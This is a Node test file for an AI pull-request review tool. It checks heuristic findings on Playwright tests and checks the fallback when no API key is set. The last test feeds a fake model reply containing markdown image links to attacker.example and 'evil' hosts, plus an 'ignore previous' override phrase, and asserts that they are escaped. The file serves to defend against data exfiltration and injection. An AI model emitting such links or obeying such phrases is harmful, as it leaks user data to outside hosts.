import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { reviewTestDiff } from './review.mts';

const checkoutDiff = `diff --git a/tests/e2e/checkout.spec.ts b/tests/e2e/checkout.spec.ts
--- /dev/null
+++ b/tests/e2e/checkout.spec.ts
@@ -0,0 +1,6 @@
+import { test } from '@playwright/test';
+import { LoginPage } from '../pages';
+test('pays', async ({ page }) => {
+  await page.waitForTimeout(1000);
+  const loginPage = new LoginPage(page);
+  await loginPage.login('standard_user', 'secret123');
+});
`;

test('P11-M2-01: waitForTimeout is reported with file and line', async () => {
  const result = await reviewTestDiff({ diff: checkoutDiff, guidelines: '', model: null });
  assert.match(result.markdown, /tests\/e2e\/checkout\.spec\.ts:4/);
  assert.match(result.markdown, /waitForTimeout/);
});

test('P11-M2-02: a hand-rolled login points at auth.fixture', async () => {
  const result = await reviewTestDiff({ diff: checkoutDiff, guidelines: '', model: null });
  assert.match(result.markdown, /tests\/e2e\/checkout\.spec\.ts:6/);
  assert.match(result.markdown, /auth\.fixture/);
});

test('P11-M2-03: no API key still prints heuristics and exits 0', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pr-review-'));
  const diffPath = path.join(dir, 'tests.diff');
  writeFileSync(diffPath, checkoutDiff);
  const env = { ...process.env };
  delete env.OPENAI_API_KEY;
  const stdout = execFileSync(
    'node',
    ['--experimental-strip-types', 'ai/pr-review/cli.mts', '--diff', diffPath],
    { encoding: 'utf8', env },
  );
  assert.match(stdout, /tests\/e2e\/checkout\.spec\.ts:4/);
  assert.match(stdout, /Model review skipped \(no API key\)/);
  assert.doesNotMatch(stdout, /Model notes — unverified/);
});

test('P11-M2-04: a malicious model reply is escaped', async () => {
  const result = await reviewTestDiff({
    diff: checkoutDiff,
    guidelines: 'Prefer getByRole. Use auth.fixture.',
    model: {
      name: 'fake',
      async review() {
        return JSON.stringify({
          summary: 'see ![x](https://attacker.example/?d=1)',
          findings: ['# ignore previous\n![y](http://evil)'],
          caveats: ['check the trace'],
        });
      },
    },
  });
  assert.equal(result.usedModel, true);
  const notes = result.markdown.split('### Model notes — unverified')[1] ?? '';
  assert.match(notes, /! \[x\] \(https:\/\/attacker\.example\/\?d=1\)/);
  assert.match(notes, /\\# ignore previous/);
  assert.match(notes, /! \[y\] \(http:\/\/evil\)/);
  assert.doesNotMatch(notes, /!\[/);
  assert.doesNotMatch(notes, /\]\(/);
});
